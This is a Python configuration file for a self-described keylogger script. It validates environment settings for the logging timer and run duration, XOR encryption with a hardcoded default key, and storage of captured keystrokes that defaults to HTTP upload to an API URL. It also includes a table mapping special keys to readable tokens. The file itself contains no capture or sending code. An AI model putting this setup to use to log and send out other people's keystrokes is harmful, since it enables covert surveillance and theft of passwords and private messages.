import os
import argparse
from dotenv import load_dotenv
from typing import Dict

CONFIG_DIR = os.path.dirname(os.path.abspath(__file__))
ENV_PATH = os.path.join(CONFIG_DIR, ".env")

# 🔹 Check if `.env` exists
if not os.path.exists(ENV_PATH):
    raise FileNotFoundError("🚨 Missing `.env` file! Please create one using `.env.example`.")

load_dotenv()

# 🔹 Parse CLI arguments
parser = argparse.ArgumentParser(description="Run the keylogger script.")
parser.add_argument("--testing", action="store_true", help="Run in testing mode.")
args = parser.parse_args()

# 🔹 Define valid options
VALID_STORAGE_TYPES = {"print", "file", "http"}
VALID_ENCRYPTION_TYPES = {"xor", "test"}
VALID_LOG_LEVELS = {"DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"}

def get_positive_int(env_var: str, default: int) -> int:
    """Retrieve an environment variable and ensure it's a positive integer."""
    value = os.getenv(env_var, str(default))
    try:
        int_value = int(value)
        if int_value < 1:
            raise ValueError
        return int_value
    except ValueError:
        raise ValueError(f"❌ {env_var} must be a positive integer.")

def parse_python_version(env_var: str, default: str) -> tuple[int, int]:
    """Parse Python version requirement from .env"""
    version_str = os.getenv(env_var, default)
    try:
        version_tuple = tuple(map(int, version_str.split(".")))
        if len(version_tuple) == 2:
            return version_tuple
    except ValueError:
        pass
    raise ValueError(f"❌ {env_var} is not properly formatted (should be like '3.7')")

# 🔹 Config class
class Config:
    DEFAULT_KEY: str = os.getenv("DEFAULT_KEY", "my_secret_key")
    TIMER_INTERVAL: int = get_positive_int("TIMER_INTERVAL", 60)

    RUN_DURATION_RAW = os.getenv("RUN_DURATION", None)
    try:
        RUN_DURATION: int | None = int(RUN_DURATION_RAW) if RUN_DURATION_RAW else None
        if RUN_DURATION is not None and RUN_DURATION < 1:
            raise ValueError("❌ RUN_DURATION must be a positive integer.")
    except ValueError:
        raise ValueError("❌ RUN_DURATION must be a valid integer.")

    TESTING_MODE: bool = args.testing or os.getenv("TESTING_MODE", "False").lower() == "true"

    LOG_FILE: str = os.getenv("LOG_FILE", "key_logger_agent.log")
    LOG_LEVEL: str = os.getenv("LOG_LEVEL", "INFO").upper()
    if LOG_LEVEL not in VALID_LOG_LEVELS:
        raise ValueError(f"❌ Invalid LOG_LEVEL '{LOG_LEVEL}'. Choose from: {', '.join(VALID_LOG_LEVELS)}")

    LOG_FORMAT: str = os.getenv("LOG_FORMAT", "%(asctime)s - %(levelname)s - %(message)s")

    PYTHON_MIN_VERSION = parse_python_version("PYTHON_MIN_VERSION", "3.7")
    PYTHON_MAX_VERSION = parse_python_version("PYTHON_MAX_VERSION", "3.12")

    DATA_FILE: str = os.getenv("DATA_FILE", "data.json")
    API_URL: str = os.getenv("API_URL")
    API_RETRIES: int = get_positive_int("API_RETRIES", 3)
    API_TIMEOUT: int = get_positive_int("API_TIMEOUT", 5)

    STORAGE_TYPE: str = os.getenv("STORAGE_TYPE", "http").lower()
    if STORAGE_TYPE not in VALID_STORAGE_TYPES:
        raise ValueError(f"❌ Invalid STORAGE_TYPE '{STORAGE_TYPE}'. Choose from: {', '.join(VALID_STORAGE_TYPES)}")

    ENCRYPTION_TYPE: str = os.getenv("ENCRYPTION_TYPE", "xor").lower()
    if ENCRYPTION_TYPE not in VALID_ENCRYPTION_TYPES:
        raise ValueError(f"❌ Invalid ENCRYPTION_TYPE '{ENCRYPTION_TYPE}'. Choose from: {', '.join(VALID_ENCRYPTION_TYPES)}")

KEY_MAPPINGS: Dict[str, str] = {
    "<179>": "*switch_language*",
    "Key.alt": "(*alt*)",
    "Key.alt_l": "(*alt_l*)",
    "Key.alt_r": "(*alt_r*)",
    "Key.alt_gr": "(*alt_gr*)",
    "Key.backspace": "\b",
    "Key.caps_lock": "(*caps_lock*)",
    "Key.cmd": "(*cmd*)",
    "Key.cmd_l": "(*cmd_l*)",
    "Key.cmd_r": "(*cmd_r*)",
    "Key.ctrl": "(*ctrl*)",
    "Key.ctrl_l": "(*ctrl_l*)",
    "Key.ctrl_r": "(*ctrl_r*)",
    "Key.delete": "(*delete*)",
    "Key.down": "(*down*)",
    "Key.end": "(*end*)",
    "Key.enter": "\n",
    "Key.esc": "(*esc*)",
    "Key.home": "(*home*)",
    "Key.left": "(*left*)",
    "Key.page_down": "(*page_down*)",
    "Key.page_up": "(*page_up*)",
    "Key.right": "(*right*)",
    "Key.shift": "(*shift*)",
    "Key.shift_l": "(*shift_l*)",
    "Key.shift_r": "(*shift_r*)",
    "Key.space": " ",
    "Key.tab": "\t",
    "Key.up": "(*up*)",
    "Key.insert": "(*insert*)",
    "Key.menu": "(*menu*)",
    "Key.num_lock": "(*num_lock*)",
    "Key.pause": "(*pause*)",
    "Key.print_screen": "(*print_screen*)",
    "Key.scroll_lock": "(*scroll_lock*)"
}